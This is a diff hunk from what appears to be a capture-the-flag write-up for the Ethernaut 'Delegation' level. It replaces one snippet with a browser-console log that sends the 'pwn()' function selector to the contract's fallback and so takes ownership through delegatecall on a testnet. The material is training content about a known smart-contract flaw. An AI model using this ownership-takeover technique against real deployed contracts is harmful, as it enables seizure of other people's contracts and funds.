@@ -44,13 +44,18 @@ contract Delegate {
 
 You can invoke the `pwn()` function by sending data in a transaction. This can be done using the Remix IDE or the console. Once you successfully invoke the function, you become the owner of the contract.
 
-```solidity
-// Invoke Delegation.sol’s fallback function
-await sendTransaction({
-    from: "0x1733d5adaccbe8057dba822ea74806361d181654",
-    to: "0xe3895c413b0035512c029878d1ce4d8702d02320",
-    data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
-});
+```javascript
+// => Instance address0x2Ac4376062CaC9089D355586D92dF23004FFA43B
+// await contract.owner()
+// '0xF781b45d11A37c51aabBa1197B61e6397aDf1f78'
+// var pwn_signature = web3.utils.keccak256("pwn()");
+// undefined
+// contract.sendTransaction({data: pwn_signature})
+// Promise {<pending>, _events: i, emit: ƒ, on: ƒ, …}
+// 31a04b09021a361c108742307a4879ae8b0d945b.js:1 ⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x22ea068378b441303a98b3cda6cb13ae1140e8ca9236fa268c448ca7d93099bc
+// 31a04b09021a361c108742307a4879ae8b0d945b.js:1 ⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0x22ea068378b441303a98b3cda6cb13ae1140e8ca9236fa268c448ca7d93099bc
+// await contract.owner()
+// '0x73103E2C30b52Ac77C138Dc4e3Af42D800DA468F'
 ```
 
 ## Key Takeaways
